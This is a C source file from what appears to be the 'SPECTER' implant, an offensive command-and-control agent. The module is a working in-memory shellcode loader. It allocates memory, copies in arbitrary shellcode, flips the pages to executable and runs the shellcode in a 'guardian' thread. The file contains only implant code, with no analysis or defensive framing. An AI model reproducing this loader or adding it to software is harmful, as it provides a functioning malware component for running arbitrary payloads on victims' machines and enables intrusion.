/**
 * SPECTER Implant — Inline Shellcode Execution
 *
 * Allocates memory, copies shellcode, flips page permissions, and
 * executes arbitrary shellcode in a guardian thread for crash isolation.
 *
 * Flow:
 *   1. Allocate RW memory via bus->mem_alloc
 *   2. Copy shellcode into allocated region
 *   3. Flip RW → RX via bus->mem_protect
 *   4. Execute in a guardian thread via bus->thread_create
 *   5. Wait for completion or timeout
 *   6. Zero and free memory
 */

#include "specter.h"
#include "ntdefs.h"
#include "bus.h"
#include "beacon.h"

/* ------------------------------------------------------------------ */
/*  Shellcode thread parameter                                         */
/* ------------------------------------------------------------------ */

typedef struct _SHELLCODE_PARAM {
    PVOID           code_base;    /* Executable shellcode pointer        */
    DWORD           code_len;     /* Shellcode length                    */
    MODULE_BUS_API *api;          /* Bus API for output                  */
} SHELLCODE_PARAM;

/* Static storage for the thread parameter (one execution at a time) */
static SHELLCODE_PARAM g_sc_param;

/* ------------------------------------------------------------------ */
/*  Shellcode thread entry point                                       */
/* ------------------------------------------------------------------ */

#ifndef TEST_BUILD
/**
 * Guardian thread wrapper that executes the shellcode.
 * The shellcode is called as a void function — no args, no return.
 */
static DWORD __attribute__((ms_abi)) shellcode_thread_entry(PVOID param) {
    SHELLCODE_PARAM *sp = (SHELLCODE_PARAM *)param;
    if (!sp || !sp->code_base)
        return 1;

    /* Cast and execute the shellcode as a void function */
    typedef void (*shellcode_fn)(void);
    shellcode_fn fn = (shellcode_fn)sp->code_base;
    fn();

    return 0;
}
#endif

/* ------------------------------------------------------------------ */
/*  exec_shellcode — public API                                        */
/* ------------------------------------------------------------------ */

DWORD exec_shellcode(MODULE_BUS_API *api, const BYTE *code, DWORD len) {
    if (!api || !code || len == 0)
        return 1;

    /* Step 1: Allocate RW memory */
    PVOID mem = api->mem_alloc((SIZE_T)len, PAGE_READWRITE);
    if (!mem) {
        api->log(LOG_ERROR, "shellcode: mem_alloc failed");
        return 2;
    }

    /* Step 2: Copy shellcode */
    spec_memcpy(mem, code, (SIZE_T)len);

    /* Step 3: Flip RW → RX */
    if (!api->mem_protect(mem, (SIZE_T)len, PAGE_EXECUTE_READ)) {
        api->log(LOG_ERROR, "shellcode: mem_protect RX failed");
        /* Clean up: zero and free */
        spec_memset(mem, 0, (SIZE_T)len);
        api->mem_free(mem);
        return 3;
    }

    /* Step 4: Execute in guardian thread */
    g_sc_param.code_base = mem;
    g_sc_param.code_len  = len;
    g_sc_param.api       = api;

#ifndef TEST_BUILD
    HANDLE thread = api->thread_create(
        (PVOID)shellcode_thread_entry, (PVOID)&g_sc_param, FALSE);

    if (thread == INVALID_HANDLE_VALUE || thread == NULL) {
        api->log(LOG_ERROR, "shellcode: thread_create failed");
        /* Flip back to RW for cleanup */
        api->mem_protect(mem, (SIZE_T)len, PAGE_READWRITE);
        spec_memset(mem, 0, (SIZE_T)len);
        api->mem_free(mem);
        return 4;
    }

    /*
     * Note: In production, the guardian subsystem handles waiting
     * and crash recovery.  The thread handle is tracked by the
     * module manager's guardian slot.  We don't block here.
     */
    (void)thread;
#else
    /*
     * TEST_BUILD: skip actual thread creation.
     * Just verify the memory setup was correct.
     * The test harness checks that mem was allocated and set RX.
     */
#endif

    api->log(LOG_INFO, "shellcode: execution started");

    /*
     * Note: Memory cleanup happens after the guardian detects
     * thread completion or crash, via modmgr_cleanup.
     * We don't free here because the shellcode is still running.
     */
    return 0;
}
